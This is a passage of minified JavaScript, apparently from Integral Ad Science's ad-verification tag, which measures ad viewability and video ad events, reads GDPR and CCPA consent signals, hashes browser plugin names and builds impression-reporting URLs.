            i.push(new Ir(0, e, a, s));
          }
        },
        s = function (e, t) {
          i.push(e), a(t), I(r).each(function (e, t) {
            t(i);
          });
        },
        c = function () {
          n.unobserve(e), n.disconnect();
        };
      return (n = t.createInstance(function (e) {
        var t,
          n,
          r,
          i,
          o,
          a,
          u = e.pop(),
          d = u.boundingClientRect,
          g = d.width,
          f = u.intersectionRatio,
          l = u.intersectionRect,
          E = (t = d, r = (n = l).left - t.left, i = r + n.width, o = n.top - t.top, a = o + n.height, new Ir(r, i, o, a));
        s(E, g), 1 === f && c();
      }, {
        threshold: [0, .1, .2, .3, .4, .5, .6, .7, .8, .9, 1]
      })).observe(e), {
        addListener: function (e) {
          r.push(e);
        }
      };
    },
    Ar = function () {
      "use strict";

      var e = function (e) {
          var t = !1;
          return _r.forEach(function (n) {
            e === n.PARTNER_NAME && (t = !0);
          }), t;
        },
        t = function (t, r) {
          return t.omidNativeInfo && t.omidNativeInfo.partnerName && e(t.omidNativeInfo.partnerName) ? r && n(r.onScreenContainerGeometry) : r && n(r.onScreenGeometry);
        },
        n = function (e) {
          return e && e.hasOwnProperty("x") && e.hasOwnProperty("y") && e.hasOwnProperty("width") && e.hasOwnProperty("height");
        };
      return {
        detect: e,
        checkAdViewGeometryBasedOnWhitelist: t,
        checkGeometryObject: n,
        checkForViewAttachmentBasedOnAdSessionType: function (e, n) {
          if (n && n.reasons && n.reasons.indexOf("notFound") < 0 && e.adSessionType && (e.adSessionType.indexOf("native") > -1 || e.adSessionType.indexOf("javascript") > -1 || e.adSessionType.indexOf("html") > -1 && t(e, n))) return !0;
        }
      };
    },
    _r = [{
      PARTNER_NAME: "IAB"
    }, {
      PARTNER_NAME: "IAS"
    }, {
      PARTNER_NAME: "com.integralads.omid.iassdk"
    }],
    Dr = function () {
      "use strict";

      return {
        listenForResult: function () {
          T.getAggregator().on(F.VIDEO_BLOCK_RESULT, function (t) {
            var n = T.getAggregator().request(x.AD_NODE),
              r = !1,
              i = "blockAd" + e.videoId;
            "failed" === t.action && (r = !0), n && I.isDef(n.blockAd) ? n.blockAd(r) : n && I.isDef(n[i]) && n[i](r);
          });
        }
      };
    };
  const vr = function () {
    "use strict";

    const e = [];
    return {
      registerEvent: (t, n) => {
        const r = function (e, t) {
          var n;
          const r = T.getAggregator().request("videoTranslator").translate(e.messageType),
            i = (e => {
              const t = e.eventData || {},
                n = I({}).mixin(t);
              return n.ext_passthrough && delete n.ext_passthrough, n;
            })(e),
            o = (e => {
              let t;
              const n = e.eventData && e.eventData.ext_passthrough,
                r = (e, t) => {
                  const n = {};
                  return n[`x_${e}`] = t, n;
                };
              return n && (t = I(n).mapToObj(r)), t;
            })(e),
            a = null === (n = g.measurementConfig) || void 0 === n ? void 0 : n.birthdate,
            s = {
              t: e.time - a,
              tp: r,
              sl: t
            };
          I(s).mixin(i), I(s).mixin(o);
          const c = I({
            indicatesPlaying: () => -1 !== "showAd|adImpression|adVideoStart|resumeAd".indexOf(r),
            indicatesNotPlaying: () => -1 !== "adVideoComplete|adStopped|stopAd|pauseAd".indexOf(r),
            indicatesFullscreen: () => {
              const e = We.getWindow();
              return !("resizeAd" !== r && "initAd" !== r || "fullscreen" !== i.viewMode && i.width !== e.screen.width);
            },
            indicatesNormalSize: () => "resizeAd" === r && "normal" === i.viewMode,
            indicatesQuartile: () => -1 !== "adVideoFirstQuartile|adVideoMidpoint|adVideoThirdQuartile|adVideoComplete".indexOf(r),
            indicatesCompletion: () => -1 !== "adStopped|adVideoComplete|adSkipped|adError".indexOf(r),
            getVolume: e => e.getVolumeFromContext(i),
            updateScreenLoc: e => {
              s.sl = e, c.sl = e;
            },
            trigger: () => {
              "adImpression" === r ? T.getAggregator().persistentTrigger(r, i, o) : T.getAggregator().trigger(r, i, o);
            },
            toString: () => "{" + I(s).toParams() + "}"
          }).mixin(s);
          return c;
        }(t, n);
        return e.push(r), r;
      },
      toString: () => "{" + I({
        vEventCount: e.length,
        vEvents: "[" + e.join(",") + "]"
      }).toParams() + "}",
      isEmpty: () => 0 === e.length
    };
  };
  var Sr = function () {
      "use strict";

      var e,
        t,
        n,
        r = function (r) {
          n = I.isDef(r) ? 0 === r : n, t && n && e.addState({
            isFullyInView: function () {
              return !1;
            }
          });
        },
        i = function () {
          e && e.hasAlwaysBeen(!0) && T.getAggregator().trigger(F.SEND_DT, A.DT_CODES.QUARTILE_FULLY_INVIEW);
        },
        o = function () {
          t = !0, r();
        },
        a = function (e) {
          var t = new Rr().getVolumeFromContext(e);
          r(t);
        };
      return {
        isApplicable: function (e) {
          return e.usesGroupMCustomMetric();
        },
        start: function (n) {
          T.getAggregator().on({
            adVideoStart: o,
            adImpression: o,
            volumeChanged: a,
            adVideoMidpoint: i
          }), e = n.createViewabilityTracker("mpt", function (e) {
            var n = T.getAggregator().request("isFullyInViewProvider");
            return !t || n && n.isFullyInView(e);
          });
        }
      };
    },
    Or = function () {
      "use strict";

      var e = {
        AdPaused: "pauseAd",
        AdVolumeChange: "volumeChanged",
        AdPlaying: "resumeAd"
      };
      return {
        translate: function (t) {
          var n = t.charAt(0).toLowerCase() + t.slice(1);
          return t in e && (n = e[t]), n;
        }
      };
    };
  const Rr = function () {
    "use strict";

    return {
      getVolumeFromContext: e => {
        let t,
          n = -1;
        return I.isDef(e) && (I.isDef(e.volume) ? n = e.volume : I.isDef(e.adVolume) && (n = e.adVolume)), -1 !== n && (t = n), t;
      }
    };
  };
  var Nr = function (t, n, r) {
      "use strict";

      var i,
        o,
        a,
        s = "IASid" + t,
        c = "getIasVidBridgeVersion" + t,
        u = [],
        d = A.OUT_OF_VIEW,
        g = !1,
        f = !1,
        l = !1,
        E = !0,
        p = new vr(),
        m = Sr(),
        h = new Dr(),
        _ = new Rr(),
        D = new Fe(),
        v = function (e) {
          var t;
          return g = !0, t = S(e), u.push(t), a && y(), t;
        },
        S = function (e) {
          var n,
            i,
            o = {};
          try {
            o = JSON.parse(unescape(e && e.data ? e.data : e));
          } catch (e) {
            o = {};
          }
          return o.id == t && ((n = p.registerEvent(o, r.getCurrentLoc())).indicatesPlaying() ? (f = !0, d = !!l && A.IN_VIEW) : n.indicatesNotPlaying() ? (f = !1, d = A.OUT_OF_VIEW) : n.indicatesFullscreen() ? (l = !0, d = f ? A.IN_VIEW : A.OUT_OF_VIEW) : n.indicatesNormalSize() && (l = !1, d = !f && A.OUT_OF_VIEW), (i = parseFloat(n.getVolume(_))) > 0 ? E = !0 : 0 === i && (E = !1)), n;
        },
        O = function () {
          i || (I(["*[data-integralas-vid-" + t + "]", ".integral-vid-" + t, "ias-ad", "object", "embed"]).findFirst(function (e, t) {
            var n = We.getDoc().querySelectorAll(t);
            return i = function (e) {
              return I(I(e).toArray()).findFirst(function (e, t) {
                return I.isFunction(t[s]);
              });
            }(n), i;
          }), !i && n.on("novidnodeerr") && Math.random() < .1 && __IntegralASDiagnosticCall("novidnode", {
            message: "node not found*10"
          }, e));
          return i;
        },
        R = function () {
          var n = O();
          return n && !g && function (n) {
            var r,
              i,
              o = Ue().wrapToGlobal(v);
            try {
              i = n[c] || n.getIasVidBridgeVersion, r = I.isFunction(i) && "2" === i.call(n) ? unescape(n[s].call(n, t, o)) : unescape(n[s].call(n, t)), g = !0, function (e) {
                I.isStr(e) && (T.getAggregator().provide("vc", function () {
                  return e;
                }), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
                  output: e
                }, W.VIDEO_CHANNEL, {
                  type: A.IMPRESSION_EVENT
                }));
              }(r || "n");
            } catch (t) {
              __IntegralASDiagnosticCall("handshakefailure", t, e);
            }
          }(n), n;
        },
        N = function (e) {
          var t = _.getVolumeFromContext(e);
          E = !!I.isDef(t) && t > 0;
        },
        y = function () {
          D.init(), I(u).each(function (e, t) {
            t && (I.isUndef(t.sl) && t.updateScreenLoc(r.getCurrentLoc()), t.trigger(), t.indicatesCompletion() && T.getAggregator().trigger(F.AD_SESSION_COMPLETE), t.indicatesQuartile() && (t.tp !== F.AD_VIDEO_COMPLETE && T.getAggregator().trigger(F.SEND_DT, A.DT_CODES.VIDEO_EVENTS), T.getAggregator().trigger(F.VIDEO_QUARTILE_EVENT, t)));
          }), u = [], a = !0;
        },
        C = function () {
          return l && f;
        };
      return _e.addEvent(We.getWindow(), "message", function (e) {
        v(e);
      }), T.getAggregator().on({
        volumeChanged: N
      }), T.getAggregator().provide({
        videoEventsString: p,
        videoVersion: function () {
          var e,
            t = R();
          try {
            e = t.getVersion();
          } catch (t) {
            e = -1, T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.NO_VIDEO_AD_INTERFACE);
          }
          return e;
        },
        videoTranslator: function () {
          return o = o || new Or();
        },
        adNode: R
      }), R(), h.listenForResult(), m.isApplicable(Ae) && m.start(r), {
        findAdNode: R,
        getViewStateOverride: function () {
          return d;
        },
        isHandshakeComplete: function () {
          return g;
        },
        triggerInitializationEvents: y,
        setVideoSpecificScreenEventFields: function (e) {
          var t = e.viewState === A.NA;
          if (e.isVideoPlaying = !0, e.isSoundOn = E, e.isVideoPlayingInFullscreen = !1, d) {
            if (d === A.OUT_OF_VIEW) {
              var n = e.reason ? e.reason.split(".") : [];
              n[n.length] = A.OUT_OF_VIEW_REASONS.VIDEO, e.reason = n.join(".");
            }
            e.viewState = t ? e.viewState : d, e.isVideoPlaying = d === A.IN_VIEW;
          }
          C() && (e.percentInView = 100, e.isVideoPlayingInFullscreen = !0);
        }
      };
    },
    yr = function () {
      "use strict";

      var e = A.PERF_TIMELINE_TRACKER_CONFIG.WRAPPERS.AS.COUNT;
      return new Pr(A.PERF_TIMELINE_TRACKER_CONFIG.WRAPPERS.AS.TYPE, e);
    },
    Cr = function () {
      "use strict";

      var e,
        t,
        n = {},
        r = 0,
        i = function (n) {
          (n || e) && (r += 5, t.onTick(r, function () {
            e ? i() : T.getAggregator().trigger("sendDt", A.DT_CODES.PERFORMANCE);
          }), e = !1);
        },
        o = function () {
          t = new oe(), r = 0, i(!0), t.start();
        },
        a = function (r, i, a, s) {
          var c = n[r];
          s ? (I.isDef(c[i]) || (c[i] = []), c[i].push(a)) : c[i] = a, t && t.isActive() || o(), e = !0;
        },
        s = function (n, r, i) {
          T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: r
          }, n, i), t && t.isActive() || o(), e = !0;
        },
        c = function (t) {
          I(n).each(function (r, i) {
            !function (t, r) {
              var i = n[t],
                o = {
                  type: r,
                  oneTime: !0,
                  minDt: !0,
                  asION: !0
                };
              I(i).isEmpty() || (T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
                output: i
              }, t, o), n[t] = {}), e = !1;
            }(r, t);
          });
        };
      return {
        start: function () {
          T.getAggregator().on("preSendDt", function (e) {
            c(e), t && t.kill();
          }), T.getAggregator().on("addThrottledProp", a), T.getAggregator().on("addThrottledOutputItem", s);
        },
        addFieldTypes: function (e) {
          I(e).each(function (e, t) {
            n[t] = {};
          });
        }
      };
    },
    Mr = function () {
      "use strict";

      var e = {},
        t = function (t) {
          return !e[t] && (e[t] = new ie(1, g.measurementConfig.birthdate)), e[t];
        },
        n = function (e) {
          t(e).start();
        },
        r = function (e) {
          var n = t(e);
          n.stop(), T.getAggregator().trigger("addThrottledProp", "im", e, n.getTime());
        };
      return {
        start: function () {
          T.getAggregator().on({
            markTime: n,
            measureTime: r
          });
        },
        isApplicable: function (e) {
          return e.on("pIntervals");
        }
      };
    },
    wr = function () {
      "use strict";

      var e = A.PERF_TIMELINE_TRACKER_CONFIG.WRAPPERS.JS.COUNT;
      return new Pr(A.PERF_TIMELINE_TRACKER_CONFIG.WRAPPERS.JS.TYPE, e);
    },
    br = function (e) {
      "use strict";

      var t = {},
        n = e instanceof Array && e.length > 0;
      return n && (I(e).each(function (e, n) {
        var r;
        t[(r = n).getType()] = r;
      }), T.getAggregator().on(F.PERF_CHECKPOINT, function (e) {
        var n = t[e.type];
        if (n) try {
          n.addPoint(e), n.isFinished() && T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.IM, "pci", n.toString());
        } catch (e) {}
      })), T.getAggregator().provide("perfActive", function () {
        return n;
      }), {
        isActive: n
      };
    },
    Pr = function (e, t) {
      "use strict";

      var n = 0,
        r = [],
        i = function () {
          var e,
            t = {};
          return r.sort(function (e, t) {
            return e.timestamp - t.timestamp;
          }), I(r).each(function (r, i) {
            e && (t[i.code] = i.timestamp - e), i.timestamp, r === n && (e = i.timestamp);
          }), t;
        };
      return {
        addPoint: function (e) {
          r.push(e);
        },
        toString: function () {
          return I(i()).toION();
        },
        getType: function () {
          return e;
        },
        setBaseOrdinal: function (e) {
          n = e;
        },
        isFinished: function () {
          return r.length === t;
        }
      };
    },
    Vr = function () {
      "use strict";

      function e() {}
      return e.build = function () {
        var e,
          t = [];
        t.push((e = A.PERF_TIMELINE_TRACKER_CONFIG.RENDER.COUNT, new Pr(A.PERF_TIMELINE_TRACKER_CONFIG.RENDER.TYPE, e)));
        var n,
          r = (n = T.getAggregator().request("vc")) ? {
            jv3: Lr,
            av3: Lr,
            jvw: wr,
            avw: yr
          }[n] : void 0;
        return r && t.push(r()), t;
      }, e;
    }(),
    Lr = function () {
      "use strict";

      var e = A.PERF_TIMELINE_TRACKER_CONFIG.VANS.COUNT;
      return new Pr(A.PERF_TIMELINE_TRACKER_CONFIG.VANS.TYPE, e);
    },
    Fr = {
      IDS: {
        BLOCK_TIME: "pBlk",
        ON_LOAD: "pLoad",
        IN_BROWSER_DELAY: "pWait"
      },
      recordBlockingTime: function () {
        "use strict";

        T.getAggregator().trigger(F.MEASURE_TIME, Fr.IDS.BLOCK_TIME);
      },
      setupOnLoadTracking: function () {
        "use strict";

        _e.addEvent(t, "load", function () {
          T.getAggregator().trigger(F.MEASURE_TIME, Fr.IDS.ON_LOAD);
        });
      },
      setupBrowserDelayTracking: function () {
        "use strict";

        var e = new oe();
        e.onTick({
          4: function () {
            T.getAggregator().trigger(F.MARK_TIME, Fr.IDS.IN_BROWSER_DELAY);
          },
          5: function () {
            T.getAggregator().trigger(F.MEASURE_TIME, Fr.IDS.IN_BROWSER_DELAY);
          }
        }), e.start();
      }
    },
    Ur = {
      isFrameworkAvailable: function (e, t) {
        var n,
          r,
          i = We.getTop(),
          o = We.getWindow();
        try {
          n = i[e];
        } catch (e) {
          for (; !r;) {
            try {
              o.frames[t] && (r = o.frames[t].parent);
            } catch (e) {}
            if (o === i) break;
            o = o.parent;
          }
        }
        return n || r;
      },
      getMessageHandler: function (e, t) {
        var n = Ur.getCallId(),
          r = function (i) {
            try {
              i && i.data && i.data[e] && i.data[e].callId === n && i.data[e].returnValue && (t(i.data[e].returnValue), _e.removeEvent(We.getWindow(), "message", r));
            } catch (e) {
              T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.GDPR);
            }
          };
        return r;
      },
      getCallId: function () {
        return "ias_" + e.asid;
      },
      send: function (e, t) {
        T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.ENVIRONMENT, e, t);
      }
    },
    xr = {
      name: "CCPAConsentDetector",
      dependencies: [],
      creator: function () {
        "use strict";

        var e;
        function t(e) {
          e && Ur.send("ccd", I(e).toION());
        }
        e = Ur.isFrameworkAvailable("__uspapi", "__uspapiLocator"), Ur.send("cca", !!e), e && function (e) {
          var n, r;
          I.isFunction(e) ? e("getUSPData", 1, t) : (n = {
            __uspapiCall: {
              command: "getUSPData",
              version: 1,
              callId: Ur.getCallId()
            }
          }, r = Ur.getMessageHandler("__uspapiReturn", t), _e.addEvent(We.getWindow(), "message", r), e.postMessage(n, "*"));
        }(e);
      },
      settings: {
        tier: A.TIERS.ENVIRONMENT,
        applies: function (e, t, n) {
          "use strict";

          return t.hasPostMessage() && !n.isDomless();
        }
      }
    },
    Wr = {
      name: "GDPRConsentDetector",
      dependencies: [],
      creator: function () {
        "use strict";

        var e,
          t = 278;
        function n(e) {
          var t = I.isDef(e) && I.isDef(e.vendorConsents) && I.isDef(e.vendorConsents[278]) ? e.vendorConsents[278] : void 0,
            n = {
              appl: I.stringifyTriState(e.gdprApplies),
              cnst: I.stringifyTriState(t),
              glbl: I.stringifyTriState(e.hasGlobalScope),
              mtdt: encodeURIComponent(e.metadata)
            },
            r = e && e.tcString;
          T.getAggregator().provide("tcString", function () {
            return r;
          }), Ur.send("gcd", I(n).toION());
        }
        e = Ur.isFrameworkAvailable("__cmp", "__cmpLocator"), Ur.send("gca", !!e), e && function (e) {
          var r, i;
          I.isFunction(e) ? e("getVendorConsents", [t], n) : (r = {
            __cmpCall: {
              command: "getVendorConsents",
              parameter: [t],
              callId: Ur.getCallId()
            }
          }, i = Ur.getMessageHandler("__cmpReturn", n), _e.addEvent(We.getWindow(), "message", i), e.postMessage(r, "*"));
        }(e);
      },
      settings: {
        tier: A.TIERS.ENVIRONMENT,
        applies: function (e, t, n) {
          "use strict";

          return t.hasPostMessage() && !n.isDomless();
        }
      }
    },
    Br = {
      name: "GDPRV2ConsentDetector",
      dependencies: [],
      creator: function () {
        "use strict";

        var e;
        function t(e) {
          var t = I.isDef(e) && I.isDef(e.vendor) && I.isDef(e.vendor.consents) && I.isDef(e.vendor.consents[278]) ? e.vendor.consents[278] : void 0,
            n = {
              appl: I.stringifyTriState(e.gdprApplies),
              cnst: I.stringifyTriState(t)
            };
          Ur.send("gcd2", I(n).toION());
        }
        e = Ur.isFrameworkAvailable("__tcfapi", "__tcfapiLocator"), Ur.send("gca2", !!e), e && function (e) {
          var n, r;
          I.isFunction(e) ? e("getTCData", 2, t) : (n = {
            __tcfapiCall: {
              command: "getTCData",
              parameter: [278],
              callId: Ur.getCallId(),
              version: 2
            }
          }, r = Ur.getMessageHandler("__tcfapiReturn", t), _e.addEvent(We.getWindow(), "message", r), e.postMessage(n, "*"));
        }(e);
      },
      settings: {
        tier: A.TIERS.ENVIRONMENT,
        applies: function (e, t, n) {
          "use strict";

          return t.hasPostMessage() && !n.isDomless();
        }
      }
    },
    Gr = {
      name: "postMessageDetector",
      dependencies: [],
      creator: function () {
        "use strict";

        var t,
          n = !1,
          r = "pmdetector" + e.asid,
          i = function (e) {
            (e && e.data) === r && (n = !0);
          };
        t = We.getWindow(), _e.addEvent(t, "message", i), t.postMessage(r, "*"), We.execAtEndOfThread(function () {
          T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.IM, "pom", I.stringifyTriState(n)), _e.removeEvent(t, "message", i);
        });
      },
      settings: {
        tier: A.TIERS.ENVIRONMENT,
        applies: function (e, t, n) {
          "use strict";

          return e.on("pmdetect") && t.hasPostMessage();
        }
      }
    },
    kr = {
      name: "safeFrameDetector",
      dependencies: [],
      creator: function () {
        "use strict";

        T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.IM, W.SAFEFRAME, I.stringifyTriState(Ae.isSafeFrame()));
      },
      settings: {
        tier: A.TIERS.ENVIRONMENT,
        applies: function (e, t, n) {
          "use strict";

          return e.on("sfdetect");
        }
      }
    },
    Hr = function (t, n, r, i, o, a, s) {
      "use strict";

      var c = "adsafe_jsinfo=",
        u = function (e, t) {
          return isNaN(e) || e < 0 || "" === e ? t : e;
        },
        d = function (e) {
          return "&" === e.slice(-1) ? "" : "&";
        },
        g = function (g) {
          var f = i.baseUrl,
            l = u(e.sp_imp_maxLength, 2e3);
          if (Ae.integratedBlockingApplies(f) && (f = function (t) {
            var n = T.getAggregator().request("mobileApp"),
              r = n && n.isMobileAppEnvironment && n.isMobileAppEnvironment(),
              i = t + "adContainerId=" + e.contextNode.getAttribute("data-ias-container") + "&cbFunctionName=" + e.contextNode.getAttribute(A.CALLBACK_IDENTIFIER.toString());
            i = r ? i.replace("monitoring", "blocking") : i.replace("skeleton.js", e.integration + ".js");
            var o = e.protocol + ":" + e.staticServer + e.integration + "a.js",
              a = e.protocol + ":" + e.staticServer + e.integration + ".js";
            return i + "&true_pb=" + encodeURIComponent(e.passback) + (r ? "&redirectUrl=" + encodeURIComponent(a) : "") + (r ? "&passback=" : "&adsafe_pb=") + encodeURIComponent(o) + "&";
          }(f)), f = f.replace(A.UNIQUE_ID_TOKEN, e.asid), f += function (r, i, o) {
            var a,
              s = u(e.sp_imp_jsInfo_minLength, 0),
              d = "";
            try {
              (a = i - r - s) > 0 && (d += Xr(o, a, c.length, n.on("partialUrls")).join("&"));
            } catch (e) {
              t.add(A.ERROR_CODES.IMPRESSION_URLS);
            }
            return d;
          }(f.length, l, g), f += d(f), f += function (e, i) {
            var u = "";
            try {
              u += jr(i - e, c, t, n, r, o, a, s, i);
            } catch (e) {
              t.add(A.ERROR_CODES.JSINFO), u += "adsafe_jsinfo=e:" + t.toString();
            }
            return u;
          }(f.length, l), i.macroUrl && (f += d(f), f += i.macroUrl), e.staticFwjsMacros && (f += d(f), f += e.staticFwjsMacros), Ae.isAMZN() && -1 === f.indexOf("gdpr_consent")) {
            var E = T.getAggregator().request("tcString");
            I.isDef(E) && (f += d(f), f += "gdpr_consent=" + E);
          }
          return f;
        };
      return {
        send: function (t) {
          try {
            var n = g(t);
            e.impUrl = n, i.sendImpression(n), T.getAggregator().trigger("impressionsent"), function () {
              if (e.rts && e.rts.tracked) {
                var t = e.rts.tracked;
                T.getAggregator().trigger("notify", t);
              }
            }();
          } catch (t) {
            __IntegralASDiagnosticCall("impsend", t, e);
          }
        }
      };
    },
    Yr = function () {
      try {
        var n,
          r,
          i,
          o,
          a,
          s,
          c = e.perf;
        T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
          output: Ae.getTagTime()
        }, W.STATIC_IMPRESSION_RFW_CALL_RESPONSE_TIME);
        c.markEnd("ec"), n = c.getEnd("ec"), r = t.performance && "function" == typeof t.performance.getEntriesByName && t.performance.getEntriesByName(e.impUrl)[0], i = function (t) {
          var n = c.getStart("bd"),
            r = c.getStart(C);
          return e.jsDoSplit ? Math.round(t - n) : Math.round(t - r);
        }(n), o = function (e) {
          return Math.round(e && e.duration);
        }(r), a = function (e, t) {
          var n = t && t.responseEnd;
          return Math.round(e - n);
        }(n, r), I.isNumeric(i) && I.isNumeric(o) && I.isNumeric(a) && (s = {
          ttecl: i,
          ecd: o,
          tsecr: a
        }, T.getAggregator().trigger("addThrottledProp", A.DT_SLOT.IM, "imprf", I(s).toION()));
      } catch (e) {
        T.getAggregator().trigger("error", A.ERROR_CODES.IMPRESSION_PERFORMANCE);
      }
    },
    jr = function (t, n, r, i, o, a, s, c, u) {
      "use strict";

      var d, g, f, l, E;
      return function (r) {
        var i = I.encodeInvalidUrlChars(r.primary.join(","), e.encodeInvalidUrlChars),
          a = n,
          s = 0,
          c = function (e) {
            return a.length + e.length + 5 <= t;
          },
          u = function (e) {
            if (e) return "," + e;
          };
        return c(i) ? (a += u(i), o.impressionIsIdentifiable(!0), I(r.secondary).each(function (t, n) {
          var r = I.encodeInvalidUrlChars(n, e.encodeInvalidUrlChars);
          c(r) ? a += u(r) : s += 1;
        })) : s += r.primary.length, a += ",ov:" + s;
      }((l = {
        viewState: A.NA
      }, E = l, Ae.isDomless() ? E = c.checkScreenLoc(!0) || l : i.on("impFailSafe") ? We.getDoc().body && (E = c.checkScreenLoc(!0) || l) : I.isDef(We.getDoc().body) && (E = c.checkScreenLoc(!0)), c.isImmediatelyMeasurable() || c.requiresDelayedViewabilityEvent(), d = qr((f = E).viewState, o, i), g = Kr(f, r, i, o, a, s, c, u), T.getAggregator().trigger("eligiblerender"), {
        primary: d,
        secondary: g
      }));
    },
    qr = function (t, n, r) {
      "use strict";

      var i = T.getAggregator().request("mPage");
      return ["id:" + e.asid, "c:" + n.getCacheBustId(), "sl:" + t, "em:" + Ae.embedded, "fr:" + Ae.friendly, "thd:" + I.stringifyTriState(i.supportsVisAPI())];
    },
    Kr = function (t, n, r, i, o, a, s, c) {
      "use strict";

      const {
        measurementConfig: u
      } = g;
      var d,
        f = "NotFound",
        l = [];
      l.push("mn:" + e.mn), l.push("rg:" + e.region), e.iasProxyPartnerDomain && l.push("ipp:" + encodeURIComponent(e.iasProxyPartnerDomain)), l.push("pt:" + function () {
        var e = s.stringifyPingTimes();
        return t.viewState !== A.NA && (e += t.details), e;
      }()), l.push("mu:" + c), l.push(I(a.params()).toParams()), r.on("mrcAudit") && !Ae.isDomless() && l.push("dvs:" + We.getDoc().visibilityState), o.iterate(function (e, t) {
        var n = !t.props || I.isUndef(t.props.type),
          r = !t.props || t.props.type === A.IMPRESSION_EVENT;
        (n || r) && l.push(e + ":" + t.output());
      }), n.toString() && l.push("e:" + n.toString()), l.push(r.output()), l.push("tt:" + e.mode), l.push("et:" + (We.now() - u.birthdate)), e.perf.mark("si"), r.on("swapids") ? l.push("oid:" + e.oid) : l.push("uid:" + i.unq), l.push("v:19.8.460"), l.push("sp:" + (e.isSplitMode ? 1 : 0)), l.push("st:" + (u.staticMode ? 1 : 0)), l.push("fwm:" + ("true" === e.fwMonitoring ? 1 : 0)), r.on("resolution") && (l.push("wr:" + I(Oe.windowSize()).toArray().join(".")), l.push("sr:" + I(Oe.screenSize()).toArray().join(".")));
      var E = /iasProxyPartnerId=([\d]+)/g.exec(e.scriptUrl),
        p = E && E[1],
        m = e.proxyPartnerId || p || "";
      return m && l.push("ppi:" + m), d = function () {
        var t,
          n = "ias_xpc",
          r = String(e.scriptUrl).toLowerCase(),
          i = r.indexOf(n);
        if (i > -1) {
          var o = r.substring(i + n.length + 1),
            a = o.indexOf("&");
          t = a > -1 ? o.substring(0, a) : o;
        } else t = f;
        return t || "";
      }(), f !== d && l.push("x_xpc:" + d), l;
    },
    Xr = function (e, t, n, r) {
      "use strict";

      var i,
        o,
        a = "adsafe_url=",
        s = "&adsafe_type=",
        c = [],
        u = function (e) {
          return -1 !== e.key.indexOf("q") || -1 !== e.key.indexOf("g");
        },
        d = function (e) {
          var i,
            o,
            u,
            d = e.val,
            g = e.key,
            f = (o = g, u = a.length + s.length + c.join("&").length + o.length + n, t - u);
          r && f < d.length && f > 0 && (d = d.substr(0, f)), (d.length || "" === e.val || "" === e.type) && function (e) {
            var n = c.join("&").length;
            return e.length + n <= t;
          }(i = a + d + s + g) && c.push(i);
        };
      return e && e.length && (i = I(e).map(function (e, t) {
        if (u(t)) return t;
      }), o = I(e).map(function (e, t) {
        if (!u(t)) return t;
      }), I(i.concat(o)).each(function (e, t) {
        d(t);
      })), c;
    },
    zr = function () {
      "use strict";

      return {
        isApplicable: function (e) {
          var t = We.getWindow();
          return !(!t.navigator || !t.navigator.plugins);
        },
        start: function (e) {
          var t,
            n,
            r,
            i = We.getWindow(),
            o = Zr(i.navigator.plugins),
            a = o.hash();
          n = a.join("."), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: n
          }, W.PLUGIN_LIST, {
            type: A.IMPRESSION_EVENT
          }), a.length && (t = o.decode(a), r = t.join("."), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: r
          }, W.PLUGIN_DECODED, {
            type: A.DT_CODES.ADTALK
          }));
        }
      };
    },
    Jr = function (e, t) {
      "use strict";

      return {
        start: function () {
          try {
            var n = Qr(),
              r = n.getMethodName(e),
              i = new se(t.getEnabledScriptUrl(e));
            new ei((o = We.getDoc()).body || o.head || o.documentElement, i).getWindow()[r] = n.getMethod(t);
          } catch (e) {
            T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.FEATURE_SCRIPT);
          }
          var o;
        }
      };
    },
    Qr = function () {
      "use strict";

      var t = function (t, n, r) {
        t === e.asid && (r.unshift(n), T.getAggregator().trigger.apply(null, r));
      };
      return {
        getMethod: function (n) {
          return function (r) {
            var i = {
              asid: e.asid,
              constant: A,
              features: n,
              context: Ae,
              dtBaseURL: e.dtBaseURL,
              spg: ti
            };
            "function" == typeof r && r(t, i);
          };
        },
        getMethodName: function (e) {
          return "register_" + e;
        }
      };
    },
    $r = function () {
      "use strict";

      return {
        start: function (e, t) {
          I(e).each(function (e, n) {
            t.getEnabledScriptUrl(n) && Jr(n, t).start();
          });
        }
      };
    },
    Zr = function (e) {
      "use strict";

      var t = function (e) {
        return e.filename.replace(/\.plugin$/, "");
      };
      return {
        hash: function () {
          for (var n, r, i, o = 0, a = e.length, s = []; o < a; o++) r = t(e[o]), i = Xe.hashCode(r), n = I.toBase(i, 62).slice(-4), s.push(n);
          return s;
        },
        decode: function (n) {
          var r, i;
          return r = We.floor(We.random() * n.length), i = encodeURIComponent(t(e[r])), [n[r], i];
        }
      };
    },
    ei = function (t, n) {
      "use strict";

      var r,
        i = function () {
          return "about:blank";
        };
      return function (n) {
        var o;
        (r = Oe.createHiddenIframe()).setAttribute("src", i()), r.setAttribute("class", "_ntnrjf7826-hj"), (t || e.contextNode.parentNode).appendChild(r), o = function (e) {
          return e.contentWindow.document;
        }(r);
        var a = ["<head></head>", '<body onload="', "var d = document;", "var s = d.createElement('script');", "d.getElementsByTagName('head')[0].", "appendChild(s).src", "='" + n + "'\">"].join("");
        o.open().write(a), o.close();
      }(n), {
        getWindow: function () {
          return r.contentWindow;
        }
      };
    },
    ti = function (t) {
      "use strict";

      var n = new J();
      n.listen(function (n) {
        return n && n.scaInfoOriginatorASID && n.scaInfoOriginatorASID !== e.asid && n.cache && t.allExpectedKeysPresent(n.cache);
      }, function (e, r) {
        n.stop(), We.setTimeout(function () {
          t.isDtCallAlreadySent() || (T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.FF, "spg", r.scaInfoOriginatorASID), I(r.cache).each(function (e, n) {
            t.addToCache(e, n);
          }));
        }, We.round(1e3 * We.random()));
      }), T.getAggregator().on("addToSpg", function (e, n) {
        t.addToCache(n, e), t.isFull() && (t.sendToOtherTags(), We.setTimeout(t.sendToOtherTags, 1300), We.setTimeout(t.sendToOtherTags, 3200));
      });
    },
    ni = {
